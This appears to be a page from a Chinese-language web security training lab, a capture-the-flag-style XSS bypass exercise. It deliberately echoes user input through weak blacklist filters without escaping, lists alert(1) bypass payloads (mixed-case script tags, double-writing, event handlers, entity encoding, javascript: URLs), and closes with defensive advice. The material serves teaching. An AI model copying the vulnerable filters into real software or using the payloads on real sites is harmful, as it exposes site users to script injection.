<?php
// XSS绕过漏洞演示
$input = $_GET['input'] ?? '';

// 简单的过滤函数（可被绕过）
function weakFilter($str) {
    // 只替换小写的script标签
    $str = str_replace('<script>', '', $str);
    $str = str_replace('</script>', '', $str);
    return $str;
}

// 更强的过滤但仍可绕过
function mediumFilter($str) {
    $str = preg_replace('/<script.*?>/i', '', $str);
    $str = preg_replace('/<\/script>/i', '', $str);
    $str = str_replace('onerror', '', $str);
    $str = str_replace('onload', '', $str);
    return $str;
}

$filter_level = $_GET['filter'] ?? 'weak';
if ($filter_level === 'weak') {
    $filtered = weakFilter($input);
} else {
    $filtered = mediumFilter($input);
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS绕过漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 950px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .filter-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
        }
        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            margin: 15px 0;
        }
        .bypass-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .bypass-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #fa709a;
        }
        .bypass-card h4 {
            color: #fa709a;
            margin-bottom: 10px;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            margin-top: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 3px 0;
            word-break: break-all;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .result-box {
            background: #e8f4fd;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #fa709a;
            text-decoration: none;
            font-weight: 600;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 XSS绕过漏洞</h4>
                <p>本页面展示了各种XSS过滤绕过技术，即使有一定的防护措施，仍可能被绕过。</p>
            </div>
            
            <h2>4. 🔄 XSS绕过</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                许多网站会对用户输入进行过滤来防御XSS，但如果过滤不严谨，攻击者可以使用各种技巧绕过。<br>
                <br>
                <strong>常见绕过方法：</strong>大小写混合、双写、编码、使用其他标签等
            </div>
        </div>

        <div class="card">
            <h3>🧪 过滤测试</h3>
            <form method="GET">
                <div class="input-group">
                    <input type="text" name="input" placeholder="输入Payload..." value="<?php echo htmlspecialchars($input); ?>">
                    <select name="filter" style="padding: 12px; border-radius: 8px; border: 2px solid #e0e0e0;">
                        <option value="weak" <?php echo $filter_level === 'weak' ? 'selected' : ''; ?>>弱过滤</option>
                        <option value="medium" <?php echo $filter_level === 'medium' ? 'selected' : ''; ?>>中等过滤</option>
                    </select>
                    <button type="submit" class="btn">测试</button>
                </div>
            </form>
            
            <?php if ($input): ?>
            <div class="result-box">
                <strong>原始输入：</strong>
                <div class="code-block"><?php echo htmlspecialchars($input); ?></div>
                
                <strong>过滤后输出（存在漏洞）：</strong>
                <div style="padding: 10px; background: white; border-radius: 5px; margin-top: 10px;">
                    <?php echo $filtered; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <div class="filter-box">
                <h4>当前过滤规则：</h4>
                <?php if ($filter_level === 'weak'): ?>
                <div class="code-block">// 弱过滤 - 只替换小写script标签
function weakFilter($str) {
    $str = str_replace('<script>', '', $str);
    $str = str_replace('</script>', '', $str);
    return $str;
}</div>
                <?php else: ?>
                <div class="code-block">// 中等过滤 - 正则替换script标签和部分事件
function mediumFilter($str) {
    $str = preg_replace('/<script.*?>/i', '', $str);
    $str = preg_replace('/<\/script>/i', '', $str);
    $str = str_replace('onerror', '', $str);
    $str = str_replace('onload', '', $str);
    return $str;
}</div>
                <?php endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 绕过技巧大全</h3>
            <div class="bypass-grid">
                <div class="bypass-card">
                    <h4>1. 大小写混合</h4>
                    <p>绕过只匹配小写的过滤</p>
                    <div class="payload-list">
                        <code onclick="setInput('<ScRiPt>alert(1)</ScRiPt>')">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>
                        <code onclick="setInput('<sCrIpT>alert(1)</sCrIpT>')">&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code>
                    </div>
                </div>
                
                <div class="bypass-card">
                    <h4>2. 双写绕过</h4>
                    <p>过滤后重新组合</p>
                    <div class="payload-list">
                        <code onclick="setInput('<scr<script>ipt>alert(1)</scr</script>ipt>')">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>
                    </div>
                </div>
                
                <div class="bypass-card">
                    <h4>3. 其他标签</h4>
                    <p>不使用script标签</p>
                    <div class="payload-list">
                        <code onclick="setInput('<img src=x onerror=alert(1)>')">&lt;img src=x onerror=alert(1)&gt;</code>
                        <code onclick="setInput('<svg onload=alert(1)>')">&lt;svg onload=alert(1)&gt;</code>
                        <code onclick="setInput('<body onload=alert(1)>')">&lt;body onload=alert(1)&gt;</code>
                    </div>
                </div>
                
                <div class="bypass-card">
                    <h4>4. 编码绕过</h4>
                    <p>使用HTML实体编码</p>
                    <div class="payload-list">
                        <code onclick="setInput('<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>')">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</code>
                        <code onclick="setInput('<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>')">&lt;svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)&gt;</code>
                    </div>
                </div>
                
                <div class="bypass-card">
                    <h4>5. 伪协议</h4>
                    <p>使用javascript伪协议</p>
                    <div class="payload-list">
                        <code onclick="setInput('<a href=javascript:alert(1)>点击</a>')">&lt;a href=javascript:alert(1)&gt;点击&lt;/a&gt;</code>
                        <code onclick="setInput('<iframe src=javascript:alert(1)>')">&lt;iframe src=javascript:alert(1)&gt;</code>
                    </div>
                </div>
                
                <div class="bypass-card">
                    <h4>6. 事件绕过</h4>
                    <p>使用其他事件属性</p>
                    <div class="payload-list">
                        <code onclick="setInput('<img src=x onmouseover=alert(1)>')">&lt;img src=x onmouseover=alert(1)&gt;</code>
                        <code onclick="setInput('<input onfocus=alert(1) autofocus>')">&lt;input onfocus=alert(1) autofocus&gt;</code>
                    </div>
                </div>
            </div>
            
            <div id="flagBox" class="flag-box">
                🚩 FLAG{XSS_Bypass_Techniques_Mastered}<br>
                <span style="font-size: 0.9rem;">你成功绕过了XSS过滤！</span>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>使用成熟库：</strong>如HTML Purifier、DOMPurify进行输入净化<br>
                2. <strong>输出编码：</strong>使用htmlspecialchars()对所有输出进行编码<br>
                3. <strong>CSP策略：</strong>Content-Security-Policy头限制脚本来源<br>
                4. <strong>HttpOnly Cookie：</strong>防止XSS窃取Cookie<br>
                5. <strong>框架自动转义：</strong>使用现代Web框架的自动转义功能
            </div>
            <a href="index.php" class="back-link">← 返回XSS模块首页</a>
        </div>
    </div>

    <script>
        function setInput(value) {
            document.querySelector('input[name="input"]').value = value;
        }
        
        // 检测是否成功绕过
        window.onload = function() {
            const result = document.querySelector('.result-box');
            if (result) {
                const html = result.innerHTML;
                if ((html.includes('<script>') || html.includes('<img') || 
                     html.includes('<svg') || html.includes('onerror=') ||
                     html.includes('onload=') || html.includes('javascript:')) &&
                    !html.includes('htmlspecialchars')) {
                    document.getElementById('flagBox').classList.add('show');
                }
            }
        };
    </script>
</body>
</html>
